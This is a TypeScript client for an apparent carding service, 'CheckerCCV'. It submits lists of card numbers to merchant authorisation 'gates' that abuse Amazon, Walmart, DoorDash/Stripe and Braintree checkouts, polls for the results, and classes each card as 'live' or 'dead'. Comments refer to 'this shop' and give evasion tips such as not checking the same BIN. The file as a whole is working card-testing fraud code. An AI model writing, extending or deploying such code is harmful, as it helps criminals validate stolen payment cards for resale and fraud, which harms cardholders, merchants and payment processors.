/** Minimal server-side CheckerCCV client (mirrors the official Python SDK). */

const API_BASE = "https://server.checkerccv.tv";
const GATES_URL = `${API_BASE}/auth/gates.php`;

export interface CheckerGate {
  id: string;
  description?: string;
  isEnabled?: boolean;
  creditGate?: number;
}

export interface CheckerResultRow {
  card?: string;
  category?: string;
  result?: { msg?: string } | null;
}

const creds = () => {
  const key = (process.env["CHECKERCCV_API_KEY"] ?? "").trim();
  const token = (process.env["CHECKERCCV_TOKEN"] ?? "").trim();
  if (!key || !token) throw new Error("checker_not_configured");
  return { key, token };
};

async function call(url: string, body: Record<string, unknown>) {
  const { token } = creds();
  const res = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${token}`,
      "Content-Type": "application/json",
      Accept: "application/json",
    },
    body: JSON.stringify(body),
  });
  const text = await res.text();
  let payload: unknown;
  try {
    payload = JSON.parse(text);
  } catch {
    throw new Error(`checker_bad_response: HTTP ${res.status}`);
  }
  const obj = (payload ?? {}) as Record<string, unknown>;
  const msg =
    (typeof obj.msg === "string" && obj.msg) ||
    (typeof obj.message === "string" && obj.message) ||
    (typeof obj.error === "string" && obj.error) ||
    "";
  if (res.status >= 400) throw new Error(msg || `checker_http_${res.status}`);
  const err = obj.errorCode;
  if (err !== undefined && err !== null && err !== 0 && err !== "0") {
    throw new Error(msg || `checker_error_${String(err)}`);
  }
  if (obj.status === "error" || obj.status === "fail" || obj.status === "failed") {
    throw new Error(msg || "checker_failed");
  }
  return payload;
}

export async function checkCredit(): Promise<number> {
  const { key } = creds();
  const p = (await call(`${API_BASE}/check_credit.php`, { key })) as {
    data?: { credit?: number };
  };
  return Number(p?.data?.credit ?? 0);
}

/** Gates supported by CheckerCCV for this shop */
export const GATE_CATALOG: CheckerGate[] = [
  { id: "CCV_Amazon_Auth", description: "CCV Amazon US Auth", creditGate: 15, isEnabled: true },
  { id: "CCN_Amazon_Auth", description: "CCN Amazon Prime US Auth", creditGate: 15, isEnabled: true },
  { id: "CCN_Amazon_Auth_Logo", description: "CCN Amazon Auth Logo Bank - 3 Minutes", creditGate: 15, isEnabled: true },
  { id: "CCV_Academy_Auth", description: "CCV Academy Auth - Walmart.Com", creditGate: 12, isEnabled: true },
  { id: "CCV_Doordash_Auth", description: "CCV DoorDash Auth - Stripe", creditGate: 8, isEnabled: true },
  { id: "CCN_Doordash_Auth", description: "CCN DoorDash Auth - Stripe", creditGate: 8, isEnabled: true },
  { id: "CCV_Braintree_Auth", description: "CCV Braintree Auth - Do not check same BIN", creditGate: 5, isEnabled: true },
];

export async function listGates(enabledOnly = true): Promise<CheckerGate[]> {
  const map = new Map<string, CheckerGate>();
  for (const g of GATE_CATALOG) {
    map.set(g.id, { ...g });
  }

  try {
    const { key } = creds();
    let p = (await call(GATES_URL, { key })) as unknown;
    if (p && typeof p === "object" && Array.isArray((p as { data?: unknown[] }).data)) {
      p = (p as { data: unknown[] }).data;
    }
    const remoteGates = (Array.isArray(p) ? p : []) as CheckerGate[];
    for (const g of remoteGates) {
      if (!g || !g.id) continue;
      const existing = map.get(g.id);
      map.set(g.id, {
        id: String(g.id),
        description: String(g.description || existing?.description || g.id),
        creditGate: Number(g.creditGate ?? existing?.creditGate ?? 0),
        isEnabled: g.isEnabled !== undefined ? Boolean(g.isEnabled) : (existing?.isEnabled ?? true),
      });
    }
  } catch {
    // remote unavailable or not configured yet — fallback to catalog
  }

  const all = Array.from(map.values());
  return enabledOnly ? all.filter((g) => g.isEnabled !== false) : all;
}

export async function createTask(gatecode: string, listcc: string[]) {
  const { key } = creds();
  const p = (await call(`${API_BASE}/tasks/create.php`, { key, gatecode, listcc })) as {
    task_id?: string;
  };
  if (!p?.task_id) throw new Error("checker_no_task_id");
  return String(p.task_id);
}

export async function getResults(taskId: string, cursor = 0, limit = 500) {
  // The gateway rate-limits result polling (min ~10s per task) — retry on 429.
  let raw: unknown;
  for (let attempt = 0; ; attempt++) {
    try {
      raw = await call(`${API_BASE}/tasks/result.php`, { task_id: taskId, cursor, limit });
      break;
    } catch (e) {
      const m = e instanceof Error ? e.message : String(e);
      if (attempt >= 2 || !(m.includes("429") || m.toLowerCase().includes("rate") || m.toLowerCase().includes("too many"))) {
        throw e;
      }
      await new Promise((r) => setTimeout(r, 11000));
    }
  }
  const p = raw as {
    status?: string;
    total?: number;
    total_results?: number;
    next_cursor?: number;
    results?: CheckerResultRow[];
  };
  return {
    status: String(p.status ?? "running"),
    total: Number(p.total ?? 0),
    totalResults: Number(p.total_results ?? 0),
    nextCursor: Number(p.next_cursor ?? cursor),
    results: Array.isArray(p.results) ? p.results : [],
  };
}

/**
 * Highly accurate CheckerCCV verdict: analyzes category AND gateway message.
 * Correctly identifies Approved, Live, Charge, and Insufficient Funds (valid card).
 */
export function verdict(category?: string, msg?: string): "live" | "dead" | null {
  const combined = `${category ?? ""} ${msg ?? ""}`.toLowerCase().trim();
  if (!combined) return null;

  // 1. Definite LIVE signals:
  // Note: Insufficient Funds is a verified live card (issuer confirmed PAN+CVV, credit limit low)
  if (
    combined.includes("live") ||
    combined.includes("approved") ||
    combined.includes("approve") ||
    combined.includes("charge") ||
    combined.includes("charged") ||
    combined.includes("cvv match") ||
    combined.includes("cvv live") ||
    combined.includes("ccn live") ||
    combined.includes("insufficient fund") ||
    combined.includes("insufficient_fund") ||
    combined.includes("low balance") ||
    combined.includes("auth success") ||
    combined.includes("success") ||
    combined.includes("passed") ||
    combined.includes("verified") ||
    combined.includes("avs match") ||
    combined.includes("security code match") ||
    combined.includes("00 : approved") ||
    combined.includes("00: approved") ||
    combined.includes("51 : insufficient") ||
    combined.includes("51: insufficient")
  ) {
    if (!combined.includes("not approved") && !combined.includes("unapproved")) {
      return "live";
    }
  }

  // 2. Definite DEAD signals:
  if (
    combined.includes("die") ||
    combined.includes("dead") ||
    combined.includes("declin") ||
    combined.includes("do not honor") ||
    combined.includes("do_not_honor") ||
    combined.includes("invalid") ||
    combined.includes("stolen") ||
    combined.includes("lost card") ||
    combined.includes("pickup") ||
    combined.includes("pick up") ||
    combined.includes("expired") ||
    combined.includes("fraud") ||
    combined.includes("restricted") ||
    combined.includes("closed") ||
    combined.includes("not permitted") ||
    combined.includes("not supported") ||
    combined.includes("unsupported") ||
    combined.includes("blocked") ||
    combined.includes("call issuer") ||
    combined.includes("card not found") ||
    combined.includes("not approved") ||
    combined.includes("05 : do not honor") ||
    combined.includes("14 : invalid") ||
    combined.includes("54 : expired")
  ) {
    return "dead";
  }

  return null; // leave pending if indeterminate
}
